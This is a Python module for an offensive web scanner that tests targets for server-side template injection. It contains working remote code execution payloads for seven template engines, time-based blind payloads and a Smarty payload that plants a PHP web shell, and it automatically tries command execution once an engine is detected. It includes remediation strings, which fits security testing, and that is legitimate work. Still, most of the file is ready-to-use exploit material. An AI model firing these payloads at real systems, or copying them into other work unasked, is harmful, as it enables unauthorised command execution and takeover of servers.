"""
Vexor SSTI Scanner v3.0 - Elite Level
Engine detection, RCE confirmation, blind SSTI, polyglot probes,
Jinja2/Twig/Freemarker/Velocity/Smarty/Pebble/Mako/Handlebars/ERB
"""
import asyncio
import re
import random
import string
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from vexor.modules.base import BaseScanner, Finding


# ─── Detection Payloads (math-based, unique per engine) ───────────────────────
# Format: (payload, expected_output, engine_name)
SSTI_DETECTION = [
    # Jinja2 / Twig (Python/PHP)
    ("{{7*7}}", "49", "Jinja2/Twig"),
    ("{{7*'7'}}", "7777777", "Jinja2"),
    ("{{config}}", "Config", "Jinja2"),
    # Freemarker (Java)
    ("${7*7}", "49", "Freemarker"),
    ("<#assign x=7*7>${x}", "49", "Freemarker"),
    # Velocity (Java)
    ("#set($x=7*7)${x}", "49", "Velocity"),
    # Smarty (PHP)
    ("{7*7}", "49", "Smarty"),
    ("{math equation='7*7'}", "49", "Smarty"),
    # Pebble (Java)
    ("{{7*7}}", "49", "Pebble"),
    # Mako (Python)
    ("${7*7}", "49", "Mako"),
    ("<%=7*7%>", "49", "Mako/ERB"),
    # Handlebars (JS)
    ("{{#with 7}}{{this}}{{/with}}", "7", "Handlebars"),
    # ERB (Ruby)
    ("<%=7*7%>", "49", "ERB"),
    # Tornado (Python)
    ("{{7*7}}", "49", "Tornado"),
    # Generic
    ("${{7*7}}", "49", "Generic"),
    ("#{7*7}", "49", "Generic"),
]

# ─── Engine-Specific RCE Payloads ─────────────────────────────────────────────
SSTI_RCE = {
    "Jinja2": [
        # Python 3 RCE via __class__ chain
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        # Jinja2 sandbox escape
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        # Via lipsum
        "{{lipsum.__globals__['os'].popen('id').read()}}",
    ],
    "Twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|map('system')|join}}",
        "{{['id']|filter('system')}}",
    ],
    "Freemarker": [
        '${"freemarker.template.utility.Execute"?new()("id")}',
        "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.Runtime\").exec(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    ],
    "Velocity": [
        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
    ],
    "Smarty": [
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
    ],
    "Mako": [
        "${__import__('os').popen('id').read()}",
        "<%\nimport os\nx=os.popen('id').read()\n%>${x}",
    ],
    "ERB": [
        "<%= `id` %>",
        "<%= system('id') %>",
        "<%= IO.popen('id').read %>",
    ],
}

# ─── Blind SSTI Payloads (time-based) ─────────────────────────────────────────
SSTI_BLIND_TIME = [
    # Jinja2 sleep
    ("{{''.__class__.__mro__[1].__subclasses__()[276](['sleep','3'],stdout=-1).communicate()}}", 2.5, "Jinja2"),
    # Python time.sleep via Jinja2
    ("{{config.__class__.__init__.__globals__['__builtins__']['__import__']('time').sleep(3)}}", 2.5, "Jinja2"),
    # Freemarker sleep
    ('${"freemarker.template.utility.Execute"?new()("sleep 3")}', 2.5, "Freemarker"),
    # Velocity sleep
    ("#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('sleep 3'))$ex.waitFor()", 2.5, "Velocity"),
]

# ─── Polyglot Probes ──────────────────────────────────────────────────────────
POLYGLOT_PROBES = [
    # Works in multiple engines
    ("${{<%[%'\"}}%\\", None, "Polyglot Error Probe"),
    ("{{7*7}}${7*7}<%=7*7%>#{7*7}", "49", "Polyglot Math"),
]


class Scanner(BaseScanner):
    """SSTI Scanner v3.0 - Elite Level"""

    MODULE_NAME = "ssti"
    MODULE_DESC = "SSTI: Engine Detection/RCE/Blind/Polyglot — Jinja2/Twig/Freemarker/Velocity/Smarty/Mako/ERB"

    async def scan(self) -> list[Finding]:
        async with self:
            await asyncio.gather(
                self._scan_url_params(),
                self._scan_forms(),
                self._scan_headers(),
                return_exceptions=True,
            )
        return self.findings

    async def _scan_url_params(self) -> None:
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        if not params:
            common = ["q", "search", "name", "input", "text", "template", "msg", "message", "title"]
            params = {p: ["test"] for p in common}

        for param in list(params.keys())[:8]:
            await self._test_ssti(self.target, param, "GET", {})

    async def _scan_forms(self) -> None:
        resp = await self.get(self.target)
        if not resp:
            return
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, "lxml")
            for form in soup.find_all("form")[:3]:
                action = form.get("action", self.target)
                form_url = urljoin(self.target, action)
                method = form.get("method", "get").upper()
                form_data = {}
                for inp in form.find_all(["input", "textarea"]):
                    name = inp.get("name", "")
                    if name and inp.get("type", "text") not in ["hidden", "submit", "button"]:
                        form_data[name] = inp.get("value", "test")
                for name in form_data:
                    await self._test_ssti(form_url, name, method, form_data)
        except Exception:
            pass

    async def _scan_headers(self) -> None:
        """Test HTTP headers for SSTI (User-Agent, Referer, etc.)"""
        for header in ["User-Agent", "Referer", "X-Forwarded-For"]:
            for payload, expected, engine in SSTI_DETECTION[:5]:
                try:
                    resp = await self.get(self.target, headers={header: payload})
                    if resp and expected and expected in resp.text:
                        self.add_finding(Finding(
                            severity="CRITICAL",
                            module=self.MODULE_NAME,
                            vuln=f"SSTI in HTTP Header ({header}) — {engine}",
                            endpoint=self.target,
                            param=header,
                            payload=payload,
                            evidence=f"Header '{header}' evaluated: '{payload}' → '{expected}'",
                            description=(
                                f"SSTI via {header} header. Engine: {engine}. "
                                "Header value is rendered in a template."
                            ),
                            remediation="Never render HTTP header values in templates.",
                        ))
                        return
                except Exception:
                    continue

    async def _test_ssti(self, url: str, param: str, method: str, base_data: dict) -> None:
        """Test a parameter for SSTI with engine detection and RCE attempt"""
        # Phase 1: Polyglot error probe
        for payload, expected, engine in POLYGLOT_PROBES:
            try:
                resp = await self._send(url, param, payload, method, base_data)
                if resp and self._has_template_error(resp.text):
                    # Template engine is processing input — now identify it
                    break
            except Exception:
                continue

        # Phase 2: Engine detection via math payloads
        detected_engine = None
        for payload, expected, engine in SSTI_DETECTION:
            try:
                resp = await self._send(url, param, payload, method, base_data)
                if resp and expected and expected in resp.text:
                    detected_engine = engine
                    self.add_finding(Finding(
                        severity="CRITICAL",
                        module=self.MODULE_NAME,
                        vuln=f"SSTI Detected — {engine}",
                        endpoint=url,
                        param=param,
                        payload=payload,
                        evidence=f"'{payload}' evaluated to '{expected}' — {engine} confirmed",
                        description=(
                            f"Server-Side Template Injection in '{param}'. "
                            f"Engine: {engine}. "
                            "RCE is likely possible."
                        ),
                        remediation=(
                            "Never pass user input to template engines. "
                            "Use sandboxed templates. "
                            "Validate and sanitize all inputs."
                        ),
                    ))
                    break
            except Exception:
                continue

        if not detected_engine:
            # Phase 3: Blind SSTI via timing
            await self._test_blind_ssti(url, param, method, base_data)
            return

        # Phase 4: Attempt RCE with engine-specific payloads
        await self._attempt_rce(url, param, method, base_data, detected_engine)

    async def _attempt_rce(self, url: str, param: str, method: str, base_data: dict, engine: str) -> None:
        """Attempt RCE with engine-specific payloads"""
        # Normalize engine name for lookup
        engine_key = engine.split("/")[0]  # "Jinja2/Twig" -> "Jinja2"
        rce_payloads = SSTI_RCE.get(engine_key, SSTI_RCE.get("Jinja2", []))

        for payload in rce_payloads:
            try:
                resp = await self._send(url, param, payload, method, base_data)
                if not resp:
                    continue

                # Check for RCE indicators
                rce_patterns = [
                    r"uid=\d+\(",    # Linux id command
                    r"root:x:0:0",   # /etc/passwd
                    r"Windows",      # Windows system info
                    r"Microsoft",    # Windows
                ]
                for pattern in rce_patterns:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        match = re.search(pattern, resp.text, re.IGNORECASE)
                        start = max(0, match.start() - 10)
                        end = min(len(resp.text), match.end() + 100)
                        evidence = resp.text[start:end].strip()

                        self.add_finding(Finding(
                            severity="CRITICAL",
                            module=self.MODULE_NAME,
                            vuln=f"SSTI — Remote Code Execution ({engine_key})",
                            endpoint=url,
                            param=param,
                            payload=payload,
                            evidence=f"RCE confirmed:\n{evidence}",
                            description=(
                                f"SSTI in '{param}' achieves Remote Code Execution. "
                                f"Engine: {engine_key}. "
                                "Attacker has full server access."
                            ),
                            remediation=(
                                "CRITICAL: Fix SSTI immediately. "
                                "Never render user input in templates. "
                                "Use sandboxed template environments."
                            ),
                        ))
                        return
            except Exception:
                continue

    async def _test_blind_ssti(self, url: str, param: str, method: str, base_data: dict) -> None:
        """Test for blind SSTI via timing"""
        for payload, threshold, engine in SSTI_BLIND_TIME:
            try:
                import time
                start = time.time()
                resp = await self._send(url, param, payload, method, base_data)
                elapsed = time.time() - start

                if elapsed >= threshold:
                    # Confirm: benign payload should be fast
                    start2 = time.time()
                    await self._send(url, param, "test", method, base_data)
                    elapsed2 = time.time() - start2

                    if elapsed2 < 1.0:
                        self.add_finding(Finding(
                            severity="HIGH",
                            module=self.MODULE_NAME,
                            vuln=f"Blind SSTI — Time-Based ({engine})",
                            endpoint=url,
                            param=param,
                            payload=payload,
                            evidence=f"Delay: {elapsed:.2f}s | Baseline: {elapsed2:.2f}s",
                            description=(
                                f"Blind SSTI in '{param}' via timing. Engine: {engine}. "
                                "Template code executes but output is not reflected."
                            ),
                            remediation=(
                                "Never pass user input to template engines. "
                                "Use sandboxed templates."
                            ),
                        ))
                        return
            except Exception:
                continue

    def _has_template_error(self, text: str) -> bool:
        """Check if response contains template engine error"""
        errors = [
            "jinja2", "templateerror", "undefined error", "template syntax",
            "freemarker", "velocity", "smarty", "twig", "mako",
            "templatenotfound", "undefinedvariable", "templateexception",
        ]
        text_lower = text.lower()
        return any(e in text_lower for e in errors)

    async def _send(self, url: str, param: str, payload: str, method: str, base_data: dict):
        try:
            if method == "POST":
                data = dict(base_data)
                data[param] = payload
                return await self.post(url, data=data)
            else:
                return await self.get(self._inject_param(url, param, payload))
        except Exception:
            return None

    def _inject_param(self, url: str, param: str, value: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
